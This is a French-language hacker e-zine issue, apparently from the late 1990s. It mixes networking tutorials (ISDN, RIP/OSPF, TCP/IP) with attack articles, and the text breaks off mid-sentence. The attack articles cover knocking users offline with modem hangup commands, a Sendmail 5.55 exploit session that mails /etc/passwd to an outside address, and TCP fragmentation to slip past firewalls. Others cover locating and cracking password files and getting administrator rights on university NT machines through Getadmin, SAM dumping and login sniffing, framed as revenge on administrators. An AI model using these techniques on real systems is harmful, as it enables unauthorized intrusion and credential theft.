The FrHack Crew
Buble

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


ISDN

Preface
Dans ce texte, je vais tenté de vous informé sur le Integrated Systems
Digital Network (ISDN). Tout bon phreaker devrait savoir comment un téléphone
marche, donc Je vous explique. Les téléphones ont été inventé pour que 
deux personnes puissent communiquer entre eux. Quand  vous parler 
dans le téléphone, votre voix fait vibrer un élément dans le microphone.
Ce dernier crée un changement de voltage qui s'envoie dans un autre téléphone.
Cette même fluctuation de voltage va dans un amplificateur, qui ensuite fait vibré
un speaker , ce qui émet un son. Ce signal est très bon pour la communication 
de la voix, mais pas pour la communication de données informatiques.

Explication
Les ordinateurs utilisent des informations digitales, seulement ON et Off, au lieu
de fluctuation de voltage, pour envoyer/recevoir de l'information. ON et Off ne marche
pas très bien sur les téléphones, c'est pourquoi on utilise un modem pour convertir 
les informations digitales en sons, avant que ca puisse être envoyer par téléphone.

Les données convertit en forme analogique mène à beaucoup d'erreur causé par le son
ou d'autres problèmes techniques. Mais avec de plus en plus d'informations en forme digitale,
les compagnies de téléphones ont décider de prendre le ISDN. Au lieu de convertir les Fax et 
les données informatiques en sons, ces dernières ont décidé d'envoyer le tout en signal digital,
et la communication par voix aurait pu être digitalisée pour ensuite être envoyer sur la même 
sorte de ligne téléphonique. Le résultat as été très bon, moins d'erreurs, et une communication
de meilleure qualité et plus rapide.

The FrHack Crew
Snowcrach

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

L'article suivant est inspiré d'un bug vieux (très vieux) qu'un de mes amis (|\|emesis) ma exposé 
récemment.  Dans ma connerie habituelle, je n'en avait jamais entendu parler, mais c'est bel et 
bien un vieux bug.  J'ai décidé de le mettre ici parce qu'il est encore d'actualité et aussi parce 
que plusieurs nouveaux venus en info ne le connaissent pas.

Principe

Vous connaissez les commandes ATZ, ATDT, etc ?  Bon, ces commandes modem sont 
diffusables sur un réseau naturellement.  Qu'adviendrait-il si on
Les modems Hayes ou US Robotics sont faits de la manière qu'ils
doivent attendre un certains intervalle de temps entre la réception de la commande de 
raccrochage et son exécution, et ceci, SANS recevoir d'autres données.  Cela est donc 
impossible sur un réseau à cause des en-têtes de packets.  Mais qu'arriverait-il si des 
compagnies n'avaient pas repris ce standards d'exécution de commande, pour ne pas payer les 
frais de brevets? (et c'est le cas!)  Et bien, nous pourrions théoriquement faire déconnecter tout 
modem ne respectant pas le standards hayes/us robotics en envoyant la commande de 
déconnection.  Ces compagnies, ne voulant pas payer pour l'utilisation du brevet, on décidé 
d'enlever l'attente entre la réception de la commande de raccrochage et son exécution - ce qui 
fait que la command est exécutée automatiquement, ce qui nous donne une personne qui se fait 
décrocher du net...



Le comment faire

Si vous êtes pas trop cons, ça sera facile... Le tout est d'envoyer cette commande d'une façon 
ou d'une autre.  Mettre la commande dans une page web - en ctcp sur irc - dans un mail - etc! 
tada!



Problemes

Bon, pour toi ami quelque peu con, voici des explications (tient, ça rime)
Primo, voici les conditions que tu devras respecter pour pouvoir déconnecter l'autre.
- Ta cible devra avoir un modem ne respectant pas le standards Hayes
- Tu ne devras pas avoir un modem ne respectant pas le standards Hayes (a moins    	que tu 
aies réassigné la valeur de la commande de raccrochage de ton 	modem)
- Les connections pas câble ne seront pas touchées - duhh
- Il serait donc préférable que ton interface réseau soit ethernet... non!? ;0)



Protection

Deux solutions :
- Va acheter un modem Hayes/US Robotics
- Réassigne la valeur de la commande de raccrochage sur ton modem - coûte sensiblement 
moins cher.


Alors si ya quelque chose que j'ai oublié, ou que j'ai de mal - oktober@beer.com !

The FrHack Crew
Oktober

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


Exploit Sendmail

Mon premier article pour ce Emag, je le consacre aux exploits des sendmails. Pour ce 
# je vais juste vous copier un script qui permet d'exploiter un bug
sur le sendmail version 5.55. Il peut en effet vous permettre d'exécuter
quelques commandes, et par le fait, peut-être prendre le etc/passwd ?!?.
( Ceci est jusse une suggestion, n'essayer pas ca à la maison, ou du moins
demander assistance à papa ou maman). Bon, voici le script que j'ai 
trouvé dernièrement à quelque part sur Internet. Je continue. La version 5.55 
c'est vieux vous me direz ? Et puis ?? C'est quoi vous pensez qui font les vieux 
serveur linux de vos écoles secondaire ?? Les profs sont tellement stupide qui nous donne accès 
au root en pensant qu'on veut faire nos devoirs . Tout ca pour dire que vous trouverez sûrement 
quelques  machines avec ces versions là. Maintenant voici comment s'y prendre : 

Supposons que vous voulez volé le passwd file d'une cible qu'on va nommer  u_suxx.com, voici 
le script que ca va donner ;

% telnet u_suxxx.com 25
 Trying 123.456.789.0...
 Connected to u_suxxx.com
 Escape character is '^]'.
 220 target.com Sendmail 5.55 ready at Mon, 12 Dec 93 23:51
 mail from: "|/bin/mail me@myhost.com < /etc/passwd"
 250 "|/bin/mail me@myhost.com < /etc/passwd"... Sender ok
 rcpt to: je_suxxx_pas
 550 je_suxxx_pas... User unknown
 data
 354 Enter mail, end with "." on a line by itself
 .
 250 Mail accepted
 quit
 Connection closed by foreign host.
 %


Et n'oublier surtout pas, mangez pas des toasts en tappant vos textes pour 
FrHack, ca fait des graines dans le putain de clavier.  

The FrHack Crew
Ashmeu

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Fragment de Paquet TCP

Preface
Dans ce texte, je vais tenté de vous expliqué comment fonctionne 
la fragmentation des paquets TCP, et également comment vous en servir
pour en faire une attaque redoutable contre les firewalls et philtres de paquets.
La fragmentation fonctionne en permettant au datagram créer comme paquet 
simple à être changer en plusieurs petits paquets pour la transmission et ensuite
être réassemblé au host qui les reçoit.

Explication
La fragmentation de paquet est nécessaire car, mis à part le protocole IP, les autres
protocoles physiques ou logiques sont utilisés pour transporté des paquets au travers
des réseaux. Un bon exemple de ce phénomène serait la différence entre un paquet
Ethernet (limité à 1024 bytes) , un paquet ATM (limité à 56 bytes) et les paquet IP 
qui ont une grandeur variable d'à peu près un demi million de bytes.

La seule exception à cette règle est dans le cas d'un datagram marqué, qui ne vas pas 
se fragmenté donc. N’importe quel datagram internet marqué ne vas pas se fragmenté
peu importe la circonstance. Si un datagram internet marqué ne peut pas se rendre à
une destination sans être fragmenté, il vas être perdu.

Le comment de l'attaque
Le mécanisme de fragmentation de paquet fait une attaque qui contourne les Firewalls
Internet, mais la raison du pourquoi que l'attaque fonctionne n'est pas la manière que
la fragmentation est fait, mais plutôt de la manière que les datagrams sont réassemblés.

Les datagrams sont supposés être fragmenté en paquet qui laisse la portion du header du 
paquet intacte, excepté pour la modification du paquet et également le remplissage d'un champ 
de Offset dans le header IP qui indique aux datagrams ou commencer. Dans le 
réassemblement, le 
réassembleur IP créer un paquet temporaire qui contient la partie fragmentée du datagram et 
ajoute les fragments qui arrivent en plaçant leur champ de données au Offset spécifique avant 
que le datagram soit réassemblé. une fois le datagram réassemblé, c'est vu comme si c'était 
arrivé en un seul paquet.

S'accordant à la spécification IP, les paquets fragmentés doivent être rassemblé au host qui les 
reçoient. Ceci veut dire qu'ils ne sont pas supposés être réassemblé à un site intermédiare 
comme un routers ou un firewall. Cette décison fut prise pour éviter le réassemblage et la 
refragmentation dans les réseaux intermédiares.

La manière dont les Firewalls et les routers bloquent les services (comme telnet) ou en 
permetant d'autres (comme le HTTP) est en regardant dans le paquet IP pour déterminer 
quelle port Transfer Control Protocol (TCP) qui est désigné. Si le port 80 est désigné, le 
datagram est destiné pour les services HTTP, ou 23 pour les services Telnet. Dans les datagram 
normal cela fonctionne bien, mais supposons que nous n'avons pas suivit les règles de 
fragmentations du datagram et que l'on as modifier ce dernier, voici ce que ca donnerait et les 
étapes à suivre.

? Créer un paquet initiale qui dira qu'il est le premier paquet d'un datagram de multiple paquet. 
Spécifier le port TCP 80 dans le header TCP pour que ca ressemble à un datagram pour les 
services HTTP, et le firewall va le laisser passer.

? Le firewall laisse passer le paquet pour le host sous attaque et laisse également passer 
quelques fragments de paquets en ordre pour permettre au host de destination de les 
rassembler.

? Un de ces paquets en fragments as un Offset de 0 ce qui cause au réassembleur à 
overwriter la partie initiale du paquet IP. Ceci est la partie du paquet IP qui spécifie le port 
TCP. L'attaquant change la définition du port TCP de son paquet qui était 80 au début pour 
le nouveau port qui est 23 admettons, et viens d'avoir accès au port 23 du host sous attaque 
car le firewall va croire que ce dernier paquet est pour les services HTTP.

The FrHack Crew
Snowcrach

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Piratage de Shell

* Vous avez access à un beau shell et vous n'aimez pas les propriétaires, ben vous pouvez vous   
venger.

* Premièrement vous allez dans /etc et vous examinez le fichier passwd sur le system (vérifiez     
pour les modifications... exemple passwd.OLD etc...).

-=[Vous devriez voir des rangés comme ca]=-

KhanAbyss:naVwowMManasMMo:10:200:Stefan Berube:/users/johnsmith:/bin/bash

    ^        ^             ^   ^          ^               ^             
    |        |             |   |          |               |             
    |        |             |   |          |               |               
    |        |             |   |          |               +---- Repertoire de lutlisateur
    |        |             |   |          +-------------------- Vrai nom
    |        |             |   +----------------------------------- Nombre du systeme
    |        |             +--------------------------------------- Niveau
    |        +----------------------------------------------------------- password caché (shadowed)
    +------------------------------------------------------------------------------------  Nom dutilisateur


[Nom dutilisateur] -le nom dutilisateur est le login avec lequel la personne se log sur le shell.
|
[Password cachés] -le password utilisateur (crackable),la cible.
|
[Niveau de l’utilisateur] -détermine quel niveau l’utilisateur est et quelles fichiers il a accès |                          
etc....
|
[Nombre du système] -un genre d’identification pour le système.
|
[Vrai nom] -le vrai nom de l’utilisateur.
|
[repertoire de l’utilisateur] -le répertoire aloué a l’utilisateur normalement /home/son_login.

-=(Endroits (sur d’autres systèmes que linux 2.0.xx) ou sont ces fichiers passwd)=-

-Système-----------------------Location-----------------------------------
AIX 3                       /etc/security/passwd                     !
       or                   /tcb/auth/files//
A/UX 3.0s                   /tcb/files/auth/?/                       *
BSD4.3-Reno                 /etc/master.passwd                       *
ConvexOS 10                 /etc/shadpw                              *
ConvexOS 11                 /etc/shadow                              *
DG/UX                       /etc/tcb/aa/user/                        *
EP/IX                       /etc/shadow                              x
HP-UX                       /.secure/etc/passwd                      *
IRIX 5                      /etc/shadow                              x
Linux 1.1                   /etc/shadow                              *
OSF/1                       /etc/passwd[.dir|.pag]                   *
SCO Unix #.2.x              /tcb/auth/files//
SunOS4.1+c2                 /etc/security/passwd.adjunct         ##username
SunOS 5.0                   /etc/shadow                            
System V Release 4.0        /etc/shadow                              x 
System V Release 4.2       /etc/security/* database
Ultrix 4                   /etc/auth[.dir|.pag]                      *
UNICOS                     /etc/udb   

-=(Pour cracker ses passwd)=-
Je vous conseille john the ripper jointe avec le fichier ci-dessous... ver:(unix,dos,win32)

The FrHack Crew
Khanabyss

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

RIP

Vous êtes vous jamais demandé comment un packet TCP/IP se rendait à destination? Pourquoi 
le spoofing était possible? Alors vous vous êtes questionné à propos des protocoles de routing 
internet.  Ce petit résumé tentera de répondre à vos questions sur la base des protocoles 
disponibles pour le routing sur internet.


? RIP - Routing Information Protocol

Le RIP est un protocole qui créé et maintient automatiquement des routes pour les packets sur 
les réseaux.  Sans ce protocole, vous devriez mettre à jour chacune des tables de routing sur 
chacun des routers de ce réseau.  Imaginez le nombre de routers sur internet...  Avec le 
protocole RIP, si un router apprend que des changements on été fait dans la table de routing 
d'un de ses voisins, il change sa table personnelle et prévient les autres routers environnant d'en 
faire autant (on dirait presque que c'est vivant!)  Donc, si jamais une ligne vient à briser, ou un 
router à être hors d'usage, les autres aux alentours tenteront de trouver un moyen de se sortir de 
l'impasse.  Notez qu'il est aussi possible de fixer manuellement des routes statiques, qui ne 
changeront pas.  Cependant, il n'est pas conseillé de mélanger routing statique et dynamique.

Voici quelques bémols à l'efficacité du RIP :

- Impossibilité du RIP de connaître la vitesse de ses voisins routers.
- Il ne peut être entouré de plus de 15 routers.
- Il y a un certain délai de réponse concernant les changements dans le réseau (ex. : advenant la 
crash d'un certain router)
- Il y a certains problèmes de sécurité, relié à l'authentification de packets (permettant le 
spoofing des packets TCP/IP).


? OSPF - Open Shortest Path First Protocol

Le protocol OSPF permet aux routers de s'échanger des informations sur leur situation (leur 
vitesse, état du système, à quels autres routers ils sont connectés, etc) et maintiennent une base 
de données complète de ces informations.  Ce protocol permet entre autres d'isoler des routers 
en disfonctionnement et permet aussi de calculer des routes rapides et ainsi d'optimiser la 
vitesse de transfert.  Aussi le OSPF possède un système d'authentification 64 bits, permettant 
ainsi d'empêcher un router non autorisé de se connecter, donc plus de spoofage...  De plus, il 
permet facilement de passer d'un réseau à un autre, en utilisant un système d'authentification 
très flexible.


L'OSPF est encore au stade de développement par le groupe de travail internet international 
(mauvaise traduction :-)  Internet Engineering Task Force) et est en voie de remplacer le RIP si il 
maintient ses promesses d'efficacités lors des tests.  Donc, le OSPF pour un net plus sécure et 
plus rapide, alors que l'on patauge dans le lag à longueur de journée!

Cet article est très court, c'est pourquoi je vous demande, si vous avez des questions, de me 
contacter à l'adresse suivante : oktober@beer.com je me ferai un plaisir de répondre à vos 
questions!

The FrHack Crew
Oktober

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Fonctionnement d'Internet

Comment ca fonctionne l'internet?  Je vais essayer de démystifier ca un peu c'est vraiment loin 
d'être compliqué.  Bon premièrement, sur l'internet (je ne vais pas vous expliquer l'histoire de 
l'internet ca serait trop long) on envoie les données par "packets".  C'est une façon parfaite et 
assurée d'envoyer/recevoir des informations sans erreurs.  

Quand un ordinateur envoie une information (que ce soit un email, un message de chat, ou 
encore une page web) il la décompose en plusieurs petites pièces d'informations appelées 
datagrammes.  Ce sont les regroupements de datagrammes qu'on appelle packets.  Chaque 
datagramme est composé de l'information qu'il doit envoyer, de son adresse d'origine et de son 
adresse de destination (donc si vous voulez vous spoofer c'est aux packets que vous devez 
vous attaquer).  

? TCP

TCP signifie "Transmission Control Protocol".  C'est un moyen très avancé de transmission sans 
erreur.  Le TCP permet de retrouver l'information qui est endommagée, perdue ou quoiqu'il 
arrive comme erreur.  C'est très simple.  L'ordinateur qui envoie l'information va l'envoyer via 
TCP et si jamais il ne reçoit pas la confirmation que l'information est arrivée a bon point (la 
confirmation s'appelle ACK) en un certain temps il renvoie l'information.  Alors disons qu'un 
packet a été endommagé pendant son voyage, était donné que l'ordinateur qui l'envoie ne 
recevra pas le ACK (quand un packet est endommagé, l'ordinateur qui le reçoit va l'effacer et 
n'envoie pas de ACK), il va renvoyer le packet, donc on ne peut pas perdre l'information.
Note:  TCP/IP est seulement la façon de spécifier que le TCP est utilisé via l'internet (IP = 
Internet Protocol) donc c'est l'adresse IP des machines que les datagrammes contiennent.

? UDP

UDP signifie "User Datagram Protocol".  Il est très différent du TCP.  Contrairement à celui-ci, 
l'UDP ne tient pas compte si les packets sont arrivés a destination ou pas.  Donc on l'utilise 
beaucoup moins que le TCP étant donné que il y a beaucoup de chances de tout recevoir les 
packets.  Ca parait bizarre comme ca mais c'est surtout utilisé dans tout ce qui est en temps 
réel.  Disons que vous voulez écouter CKOI en Real Audio. Vous allez recevoir l'information en 
UDP, vu que ce n'est pas vital si le son est moins bon ou si vous perdez 1 seconde.  Mais étant 
donné que l'UDP est plus rapide que le TCP on l'utilise partout ou on a pas besoin de précision.

N.B.: Vous vous demandez sûrement ce que les protocoles internet ont a voir avec le hack, eh 
bien je vous donne ma réponse: Vous ne pouvez pas vous attaquer a l'internet sans en connaître 
ses moindres détails, vous ne pouvez pas connaître ses points faibles si vous ne connaissez pas 
comment ca marche.

The FrHack Crew
Bismuth

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

TCP/IP

Bon, ok, on vient de m'apprendre que frhack est un magasine éducatif destiné a faire 
comprendre les bases nécessaire à une évolution dans la culture Underground. Je me propose 
donc de vous faire découvrir un protocole réseau universel, utilisé par tous les systèmes 
d'exploitations qui possèdent une ouverture réseau. Après la lecture de cet article, ne vous ne 
serez pas en mesure de vous prétendre "Master of the Net", mais il vous aidera à mieux 
comprendre ce qu'il se passe sur le réseau quand vous recevez ou émettez des données. Je vais 
essayer d'être le plus clair possible et blablabla ... blablabla, passons aux choses sérieuses.


snip------- %<------------snip----------%<-----------------snip------------------------%<-----------

FONCTIONNALITES DE TCP/IP

TCP : Transmission Control Protocol
IP     : Inetnet Protocol

En raison de sa large diffusion, TCP/IP permet d'unifier différents matériels ou logiciel (même 
sans accès à internet). TCP/IP est indépendant par rapport au matériel réseau physique, ce qui 
lui permet d'être utilisable sur de nombreux types de réseau. TCP/IP possède un système 
d'adressage commun permettant le dialogue avec tout matériel situé n'importe où sur le Réseau.

snip------- %<------------snip----------%<-----------------snip------------------------%<-----------

MODELE DE TRANSMISSION DE DONNES

Afin de pouvoir parler de réseau informatique, il faut utiliser certains termes qui possèdent une 
signification bien particulière. Quelques bases sont donc nécessaire les mots employés dans les 
communications réseau.

	##########################
	#				 #
	# COUCHE APPLICATION     #
	#			       #
	##########################
	#				 #
	# COUCHE PRESENTATION    #
	#			       #
	##########################
	#			       #			
	# COUCHE SESSION         #
	#			       #
	##########################
	#			       #
	# COUCHE TRANSPORT       #	-----------------> Le Modèle de référence
	#			       #			     OSI.
	##########################
	#			       #
	# COUCHE RESEAU	       #
	#			       #
	##########################
	#			       #
	# COUCHE LIAISON	       #
	#		             #
	##########################
	#			       #
	# COUCHE PHYSIQUE	       #
	#			       #
	##########################

COUCHE APPLICATION : La couche application constitue le niveau dans la hiérarchie des 
protocoles où résident les accès des processus réseau de l'utilisateur.

COUCHE PRESENTATION : Lorsque les applications coopèrent entres elles, elles échangent 
certaines informations. Elles doivent donc déterminer comment représenter ces données. Dans 
le modèle OSI, cette couche fournit les routines de présentation des données standardisées. 
Cette fonction est souvent assurée directement à l'intérieur de l'application, bien que de plus en 
plus de protocoles TCP/IP tels que XDR et MIME effectuent cette opération.

COUCHE SESSION : Comme pour la couche présentation, cette couche n'est pas identifiable 
sous la forme d'une couche indépendante au niveau de la hiérarchie TCP/IP. Cette couche gère 
les connexions entre les applications. Avec TCP/IP, cette fonction se réalise bien souvent dans la 
couche de transport et le terme de session n'est pas utilisé. Pour TCP/IP, les termes "sockets" et 
"ports" sont utilisés pour décrire la voie à suivre pour que les applications puissent communiquer 
entres elles.

COUCHE TRANSPORT : Cette couche du modèle OSI garantit que le récepteur reçoit les 
données telles qu'elles ont été envoyées. Avec TCP/IP cette fonction est réalisé avec TCP. 
Toutefois, TCP/IP offre un second service de transport, UDP (User Datagram Protocol) qui 
n'effectue pas les vérifications finale de bonne communication.

COUCHE RESEAU : Cette couche gère les connexion à travers le réseau et isole les protocoles 
des couches supérieure des détails du réseau sous-jacents. Le protocole IP, qui isole les couches 
supérieures du réseau et qui gère les adresses ainsi que la transmission de données est 
généralement décrit comme la couche réseau TCP/IP.

COUCHE LIAISON : La possibilité de diffuser les données à travers le réseau physique sous-
jacent est gérée par cette couche. TCP/IP crée très rarement des protocoles situés dans cette 
couche.

COUCHE PHYSIQUE : Elle définit les caractéristiques du matériel nécessaire à la propagation 
du signal. Par exemple, les niveaux électriques, le nombre et la position des broches au niveau 
de l'interface sont définis dans cette couche.

snip------- %<------------snip----------%<-----------------snip------------------------%<-----------

ARCHITECTURE DES PROTOCOLES TCP/IP


TCP/IP est généralement représenté avec moins de couche que celle utilisées dans le modèle 
OSI. Le modèle suivant fournit une représentation schématique des couches de la hiérarchie 
TCP/IP.

	#########################
	#			      #
	# COUCHE APPLICATION    #
	#	                  #
	#########################
	#				#
	# COUCHE TRANSPORT      #
	# MACHINE A MACHINE     #
	#			      #
	#########################
	#			      #
	# COUCHE INTERNET       #
	#			      #
	#########################
	#			      #
	# COUCHE RESEAU         #
	#			      #
	#########################


Comme dans le modèle OSI, les données sont transmises vers le bas de la pile lorsqu'elles sont 
émises sur le réseau; et vers le haut de la pile lorsqu'il s'agit d'une réception de données. La 
structure à 4 niveaux de TCP/IP est représenté suivant la manière selon laquelle les données 
sont gérées et transmise vers le bas de la pile de la couche application vers la couche réseau 
physique. Chaque couche de la pile ajoute certaines informations de contrôles pour s'assurer de 
la bonne livraison des données. Ces informations sont appelées "en-têtes" car elles sont placées 
avant les données à transmettre. Chacune des couches considère toutes les informations reçu 
d'une couche supérieure comme étant des données et place sa propre en-tête juste avant. L'ajout 
successif d'informations a chacune des couches est appelé "encapsulation". Lorsque des 
données sont reçues, c'est le mécanisme inverse qui se met en place. Chaque couche retire son 
en-tête avant de communiquer les données à la couche supérieure. Comme les informations 
remontent les différentes couches, les informations reçues de la couche inférieure de la pile sont 
interprétées comme étant constituées d'une en-tête et de données.

--------------------------------------------------------------------------------------------------------------
										___________
Couche application							| données |
										-----------
--------------------------------------------------------------------------------------------------------------
									_____________________
Couche transport							| en-tête | données |
									--------------------
--------------------------------------------------------------------------------------------------------------
							      _______________________________
Couche internet						| en-tête | en-tête | données |
							       ------------------------------
--------------------------------------------------------------------------------------------------------------
					      _________________________________________
Couche réseau				| en-tête | en-tête | en-tête | données |
					      ------------------------------------------
--------------------------------------------------------------------------------------------------------------

snip------- %<------------snip----------%<-----------------snip------------------------%<-----------

LA COUCHE RESEAU

La couche réseau est la couche la plus basse de la hiérarchie des protocoles TCP/IP. Les 
protocoles de cette couche fournissent les moyens nécessaire au système pour envoyer les 
données aux périphériques physique directement connectés au réseau. Les fonctions réalisés à 
ce niveau incluent l'encapsulation de datagrammes IP dans des trames transmises sur le réseau 
et la correspondance entre adresse IP et adresse MAC. En effet, les adresses IP doivent être 
converties en une adresse appropriée pour le réseau physique à travers lequel le datagramme va 
circuler.


LA COUCHE INTERNET

La couche au-dessus de la couche réseau de la hiérarchie des protocoles est la couche internet. 
IP constitue le coeur même de TCP/IP et il s'agit du protocole le plus important de la couche 
internet. IP fournit le service de base en matière d'expédition de paquets sur lequel les réseaux 
TCP/IP sont bâtis.
Je publierais prochainement un article plus en détail sur ce protocole; j'y exposerai le format d'un 
datagramme IP et tenterais de vous éclaircir l'esprit sur le routage de ces datagrammes.

LA COUCHE TRANSPORT

Les deux protocoles les plus importants dans cette couche sont TCP et UDP (User Datagram 
Protocol). TCP fournit un service de transmission de données dit fiable avec un système de 
détection et de correction d'erreurs. UDP fournit un service de transmission de datagramme en 
mode non connecté.
UDP et TCP feront à eux seuls un excellent sujet d'articles pour un prochain numéro de frhack.

LA COUCHE APPLICATION

Au sommet de la hiérarchie des protocoles TCP/IP se trouve la couche application. Cette couche 
inclut tous les processus qui utilisent les protocoles de la couche transport pour transmettre de 
l'information. Il existe un grand nombre de protocoles applicatif de ce genre. La plupart 
fournissent des services utilisateurs et de nouveaux services sont régulièrement ajoutés à cette 
couche.

Les protocoles applicatifs les plus connus sont :

	- Telnet : permet d'effectuer des login distants à travers le réseau (miam miam :-))

	- FTP : Utilisé pour transférer des fichiers d'une manière interactive ;-)

	- SMTP : Protocole de transport de mails (souvent buggé a mort afin de nous laisser 
entrer.)
	
	- HTTP : Permet de diffuser des pages web à travers le réseau.

	- DNS : Permet la résolution des adresses IP en fonction du nom de machine. Par 
exemple, avec mIRC faites : /dns www.yahoo.com et vous obtiendrez l'IP du serveur de yahoo.

	- NFS : Permet aux fichiers d'être partagés par plusieurs machine connecté au réseau 
(voir article dans frhack #1).


snip------- %<------------snip----------%<-----------------snip------------------------%<-----------

Bon voilà, quand on vous parlera de TCP/IP vous saurez de quoi il s'agit, maintenant c'est à 
vous d'être imaginatif et de vous renseigner pour en savoir plus.
Merci de m'avoir lu, merci à Snowcrach de me faire confiance.
Je remercie Bubble (pas celui qui traîne en ce moment sur #hack.fr) car c'est lui qui m'a tout 
appris, Je ne remercie pas les supermarchés GEANT CASINO qui m'ont vendus un PC de daube 
car en 4 mois, il a fallu que je change : le lecteur CD, l'alimentation et deux fois la carte mère 
!!!!!! N'achetez pas de matériel info à GEANT CASINO, je vous demande de boycottez cette 
enseigne. Je ne remercie pas Farce Telecom pour les tarifs encore trop cher de connexion à 
internet.
Je remercie l'équipe de FrHack .
J'embrasse ma copine illona qui n'ai pas intéressé par le hacking et qui sait me ramener a la 
raison quand il se fait tard et que je suis encore devant mon écran.

The FrHack Crew
Kthulu

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

					  ú$$$¥¥¥$$$¥¥¥$$$¥¥¥$$$ù
					  §		   		§
					  §	HaCk your Fac 2	§
					  §		   		§
					  ú$$$¥¥¥$$$¥¥¥$$$¥¥¥$$$ù

						By Fedaikin


s0RC3Ry avait ecrit dans Noroute #1 un texte qui s'appellait "Fac Hak". 
Ce texte m'a enormement servi mais j'ai voulus aller plus loin. C'est 
pourquoi j'ai ecrit ce texte. Je vais suivre en quelques sortes les 
traces de s0RC3Ry puisque je vais tenter de vous expliquer comment 
passer root a votre fac (de quoi faire chier votre admin ;) 

Le materiel necessaire est :-Un account sur une becanne de la fac..
				    -Une becanne avec Unix et/ou NT.. (Si vous 
avez pas NT c'est pas la peine...)
                            -Une legere connaissance des OS..                         
				    -Une conscience..

Je vais vous expliquer comment obtenri les acces Admin de votre Fac sous 
NT .

Je vous conseille vivement de lire le texte de s0RC3Ry car il explique 
enormement de truc sur Unix et le compte ROOT qui sont les bases. Pour 
ma part je considere que vous les avez (j'en expliquerai tou de meme 
quelques une...)

I . Le Password Admin Local sous NT
	1. Details sur NT
	NT est en theorie un systeme d'exploitation beneficiant de la 
certification C2. Ce qui signifie qu'il est au plus haut point de 
securite possible des OS. J'ai bien dit en THEORIE ;)
	Il y a plusieurs composants tres interressants dans NT. Le 
LSA(Local Security Authority) qui gere les login et les audits. Le SAM 
(Security Account Manager) qui contient les passwords et les donnes au 
LSA. Enfin le SRM (Security Reference Monitor) qui genere les messages 
d'audits et renforce la securite du LSA.
	Qu'est-ce qu'un audit, vous me direz... Un audit et un executable 
que l'Admin lance sur certains fichier, programmes ou repertoires, et 
qui notte qui a utilise ce fichier et pendant combien de temps.
	Il n'y a pas que l'audit qui est tres chiant; y'a aussi les 
Service Packs... Ce sont des programmes qui sont crees par MS pour 
corriger des bugs dans NT qui pourraient constituer des trous de 
securitee. Au jour ou j'ecrit ce texte, le SP4 vient de sortir.

	2. Passwords sous NT
	Le password est contenu dans un fichier nomme SAM. Ce fichier 
existe en plusieurs exemplaires. Celui qui est utilise par NT est le 
fichier SAM (ou Sam.log) situe dans le repertoire 
WINNT\SYSTEM32\CONFIG\SAM. Le probleme est que ce fichier est utilise 
par NT et donc illisible avec NT demarre!!! Mais pas de probleme car NT 
est pas intelligent et a peur de le perdre; c'est pourquoi il le 
sauvegarde dans un fichier sam.sav. Il existe aussi le fichier Sam_ qui 
contient le pass Admin au moment de l'installation mais si l'admin est 
pas trop con il l'aura change....

	3. Passer Aministrateur sous NT en local
	Ca peut etre tres pratique pour installer des progs qui demandent 
d'etre Admin...
		a) La Solution Getadmin
	Pour passer root sous NT il y a plusieurs solutions biensur. La 
premiere est d'utiliser un exploit nommé Getadmin.exe. Le probleme est 
que cet exploit est patche par le Service Pack 3. Mais mais mais, il y a 
toujours une solution, elle se nomme Crash4.exe. Ce dernier programme 
est a utiliser si le SP3 est installe sur votre machine, il remet en 
place quelques trucs dans la pile de NT et autorise l'utilisation de 
Getadmin.exe. Comment savoir si le SP3 est installe? C'est tres simple, 
il vous suffit de le copier dans le repertoire  c:\temp (vous y avez les 
droits ;) avec son DLL GASYS.DLL et executez le en tapant getadmin GUEST 
(ou tout autre compte que vous voulez passer en root). Si ca marche pas 
de probleme sinon il vous faudra executer Crash4.exe et ensuite 
reexecuter Getadmin.
		b) L'extraction du fichier Sam
	Une autre solution bien plus amusante est de chopper le password 
Administrateur. Pour cela on va recuperer le fichier Sam... Le probleme 
est que ce fichier est utilise par NT et donc il est innaccessible. Il y 
a toute fois une solution. Elle consiste a booter sur une disquette 
(donc sous DOS) et de monter la partition NTFS grace a un programme cree 
par Rhino9 nomme ntfsdos.exe. Ce programme permet de monter la partition 
NTFS et donc de pouvoir lire dessus sans aucune restriction habituelle. 
On pourra donc recuperer le password Admin et le cracker ensuite. Mais 
avant il faut le dumper car il est code. Pour cela il faut utiliser 
Pwdump.exe ou Samdump.exe, le fichier est ainsi lisible (mais le pass 
est toujours crypte). Une autre solution pour le dumper est d'utiliser 
le cracker de passwords L0pthcrack. Vous devrez de toute facon passer 
par ce prog car c'est le meilleur cracker de pass NT que je connaisse.
Ca prendra surement du temps mais ca vaut le coup ;)

II . Le password Admin sur le reseau
	Pour ce pass faudra gruger un peu (reflechir en bon francais...). 
Comme vous le savais pour certains deja bien, je suis un fana du 
sniffing (voir frhack#1). On vas donc encore sniffer comme de vrai 
toxicos ;)
La config de votre reseau est tres importante vous vous en doutez. Le 
mieux c'est d'avoir un reseau Ethernet. Plusieurs solutions se 
presentent alors a vous : sniffer au moment du login ou sniffer au 
moment de la recuperation des mails.
Pour sniffer au login rien de plus simple, il vous suffira d'utiliser 
encore une fois L0phtcrack. Le dernier en date, le 2.51 l'integre 
graphiquement. c'est trop fun non??? Alors vous le lancez et vous 
attendez. Perso je n'ai pas teste la derniere version mais dans les 
versions precedentes leur prog readsmb marche tres bien, on peut donc 
